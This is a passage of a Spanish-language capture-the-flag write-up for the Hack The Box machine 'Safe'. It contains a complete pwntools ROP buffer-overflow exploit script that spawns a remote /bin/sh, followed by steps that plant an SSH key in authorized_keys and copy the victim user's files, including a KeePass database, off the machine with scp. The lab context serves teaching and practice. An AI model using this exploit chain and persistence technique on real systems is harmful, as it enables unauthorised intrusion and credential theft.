&lt;p&gt;Ya con toda esta información, es posible finalmente, explotar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Return Oriented Programming&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadgets&lt;/code&gt;, por lo que regresaremos a nuestro script en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lo primero que vamos a hacer, es comentar o borrar la línea en la que aplicábamos un &lt;em&gt;breakpoint&lt;/em&gt; a la llamada al sistema, ya que no la vamos a usar más, esto mismo haremos con la línea del p.recvuntil(). Por otra parte, vamos a empezar por definir variables; la primera será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;popR13&lt;/code&gt;, la cual va a valer la dirección en la que se aplica este &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadget&lt;/code&gt;; la segunda será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;, la cual va a valer la dirección de la llamada al sistema; la tercera será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;, la cual va a valer la dirección de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;La dirección de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;, la podemos sacar de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/27.png&quot; alt=&quot;27&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;popR13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x401206&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40116e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x401152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Es importante tener en cuenta que, en todo momento, estamos trabajando en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64 bits&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Por otra parte, vamos a empezar por definir el número de &lt;em&gt;letras A&lt;/em&gt; que queremos introducir, previo a desbordar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt;, esto lo vamos a almacenar en una variable de nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;junk&lt;/code&gt;, eso si, deberemos de codificar la variable en formato bytes.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si nos percatamos, estamos introduciendo &lt;em&gt;112 letras A&lt;/em&gt;, y no &lt;em&gt;120&lt;/em&gt;, porque ciertamente el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt; se desborda con &lt;em&gt;112 bytes&lt;/em&gt;, como pudimos ver con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;, no obstante, para poder empezar a sobrescribir registros tenemos que introducir &lt;em&gt;120 bytes&lt;/em&gt; como vimos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, pues estamos frente a un &lt;em&gt;sistema operativo&lt;/em&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64 bits&lt;/code&gt;, por lo que necesitamos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8 bytes&lt;/code&gt; para insertar un valor en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack&lt;/code&gt;, en caso de estar en un sistema operativo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32 bits&lt;/code&gt;, necesitaríamos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4 bytes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Entonces, la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local_78&lt;/code&gt; ciertamente tiene una longitud máxima de &lt;em&gt;112 bytes&lt;/em&gt;, sin embargo, necesitamos de &lt;em&gt;8 bytes&lt;/em&gt; más, para desbordar satisfactoriamente el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt;, de este modo, los bytes siguientes a 112 se estarían almacenando en el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, pero hasta que no introduzcamos como mínimo &lt;em&gt;120 bytes&lt;/em&gt;, no vamos a conseguir un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Segmentation Fault&lt;/code&gt;, razón por la cual, si al binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, le pasamos una cadena ya sea de 113, 114, 115, 116 117, 118 o 119 bytes, conseguiremos una salida exitosa.&lt;/p&gt;

&lt;p&gt;Lo que nos interesa ahora, es sobrescribir el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt; con nuestro código malicioso, de modo que este pase al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSI&lt;/code&gt;, de modo que cuando se ejecute la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; hacia la dirección de la llamada al sistema, nos ejecute nuestro código.&lt;/p&gt;

&lt;p&gt;Concretamente vamos a ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; en adición de un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null byte&lt;/code&gt; por si nos da problemas, la longitud total de esta cadena es de &lt;em&gt;8 bytes&lt;/em&gt;, (7 en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, más el del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null byte&lt;/code&gt;) por lo que estaríamos desbordando el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt;, e ingresando esta cadena en el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;La siguiente variable por definir será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binSh&lt;/code&gt;, la cual, como mencionamos, valdrá el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; en adición de un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null byte&lt;/code&gt;, y al igual que la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;junk&lt;/code&gt;, deberemos codificarla; la última variable que definiremos será, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nullByte&lt;/code&gt;, la cual usaremos para asignar valores nulos a las direcciones &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R14&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R15&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;binSH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;nullByte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya para finalizar, debemos indicar la cadena de caracteres que queremos enviar, después de que se nos pregunte &lt;em&gt;What do you want me to echo back?&lt;/em&gt;, para hacer esto tendremos que hacer uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p.sendline()&lt;/code&gt;, dentro del cual indicaremos las variables que acabamos de definir, en su respectivo orden.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binSH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;popR13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En primer lugar estamos introduciendo una cadena de &lt;em&gt;112 bytes&lt;/em&gt;, posteriormente introducimos nuestro código malicioso que suma una longitud de &lt;em&gt;8 bytes&lt;/em&gt;, de modo que estaríamos ya, sobrescribiendo el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, que se convertirá en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSI&lt;/code&gt;, posteriormente, haremos una llamada al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadget pop&lt;/code&gt;, al cual le pasaremos como argumentos lo que nos solicita, la dirección de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R13&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R14&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R15&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RET&lt;/code&gt;, los cuales valdrán la dirección de la llamada al sistema, valor nulo, valor nulo y como función de regreso, la dirección de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;, redirigiendo así, el flujo del programa a través de esa función.&lt;/p&gt;

&lt;p&gt;Ya lo que nos quedaría, sería ejecutar nuestro script, no de manera local, pero remota, para lo cual debemos introducir la dirección IP de la máquina víctima, e indicar el puerto a través del cual nos queremos conectar.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;10.10.10.147&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Así mismo, es necesario especificar que queremos interactuar con la consola que estamos consiguiendo, para lo cual deberemos indicar lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nuestro script, debería verse algo así:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gnome-terminal&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-x&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# p = gdb.debug(&apos;/ubicación/del/binario/myapp&apos;, &apos;b *0x40116e&apos;)
# p.recvuntil(&quot;What do you want me to echo back?&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;10.10.10.147&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;popR13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x401206&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40116e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x401152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;binSh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;nullByte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binSh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;popR13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nullByte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nullByte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Al ejecutar nuestro script, lo que vamos a conseguir es una consola, por lo que una vez dentro del sistema, podríamos listar la flag del usuario con bajos privilegios.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -name user.txt 2&amp;gt; /dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/28.png&quot; alt=&quot;28&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;

&lt;p&gt;Para conseguir la flag del usuario con máximos privilegios, podemos emepezar por listar el contenido dentro de la carpeta del usuario user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/29.png&quot; alt=&quot;29&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos vamos a encontrar con una serie de imágenes, en adición de un archivo de extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.kdbx&lt;/code&gt;, el cual guarda relación con el gestor de contraseñas KeePass. Debido a que nos encontramos en una máquina remota, no podremos visualizar las imágenes alojadas dentro de la máquina víctima, por lo que tenemos que buscar una forma de transferirlas a nuestro equipo.&lt;/p&gt;

&lt;p&gt;Si recordamos, el puerto 22 estaba abierto, por lo que podríamos conectarnos por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; a la máquina remota, no obstante, ¿cómo nos vamos a conectar sin proporcionar credenciales? Esto lo haremos introduciendo nuestra clave pública, dentro de un archivo de nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; ubicado en la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ssh&lt;/code&gt;, dentro del directorio del usuario user.&lt;/p&gt;

&lt;p&gt;Lo primero que haremos será crear un par de claves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, una pública, y una privda, esto lo haremos haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh-key&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd ~/.ssh/
ssh-keygen
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/30.png&quot; alt=&quot;30&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En caso de querer ingresar algún tipo de contraseña, se lo puede hacer. Ya teniendo el par de claves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, vamos a copiar el contenido de nuestra clave pública, para posteiormente añadirla en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/user/.ssh/authorized_keys&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;nuestraClavePública&quot; &amp;gt;&amp;gt; /home/user/.ssh/authorized_keys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/31.png&quot; alt=&quot;31&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hecho esto, podemos conectarnos a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; a la máquina víctima.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh user@10.10.10.147
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/32.png&quot; alt=&quot;32&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En vista de que estamos conectados a la máquina vía &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, podríamos intentar transferir los archivos del directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/user/&lt;/code&gt;, haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCP&lt;/code&gt; (&lt;em&gt;Secure Copy Protocol&lt;/em&gt;), aunque también pudimos haberlo hecho creando un servidor en la máquina remota mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Busybox&lt;/code&gt;, y posteriormente, descargando las imágnes a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wget&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp &quot;user@10.10.10.147:/home/user/*&quot; .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/33.png&quot; alt=&quot;33&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

